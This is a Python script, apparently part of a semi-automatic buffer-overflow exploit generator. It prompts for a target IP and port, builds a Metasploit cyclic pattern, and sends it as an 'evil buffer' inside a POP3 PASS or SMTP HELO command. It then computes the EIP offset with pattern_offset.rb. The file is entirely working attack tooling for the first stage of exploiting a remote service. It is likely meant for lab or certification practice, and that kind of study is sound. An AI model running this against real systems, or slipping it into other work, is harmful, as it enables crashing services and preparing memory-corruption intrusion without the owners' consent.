#!/usr/bin/python3.6
null    = """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""


import socket
import os

print("The purpose of this step is to find the location of where the buffer breaks into memory, aka the \"break point.\"")
ipaddr  = input("What is the ip of the machine you are trying to find the break point of?\n> ")
portnum = input("What is the port number of the application you are trying to find the break point of?\n> ")
portnum = int(portnum)
bytes	= input("How many bytes (letters) would you like to send (verified in step 2)?\n> ")
bytes	= int(bytes)
s       = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer	= os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {}".format(bytes)).read()
service_greeting        = "PASS "
if portnum      == 25:
	service_greeting        = "HELO "
elif portnum    == 110:
	service_greeting        = "PASS "


try:
	print("\nSending evil buffer...")
	s.connect((ipaddr, portnum))
	data = s.recv(1024)
	a       = "USER username" + "\r\n"
	s.send(a.encode())
	data = s.recv(1024)
	b       = service_greeting + buffer +"\r\n"
	s.send(b.encode())
	print("\nDone!")
except:
	print("Could not connect to POP3!")





while True:
	print("Ok now lets find the location of that register")
	register	= input("Give me the location of the register (EIP) as it is shown (not in little endian).\n> ")
	if len(register) == 8:
		os.system("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {}".format(register))
		print("Congratulations, you have found the break point! Annotate this for future steps.")
		break
	else:
		continue
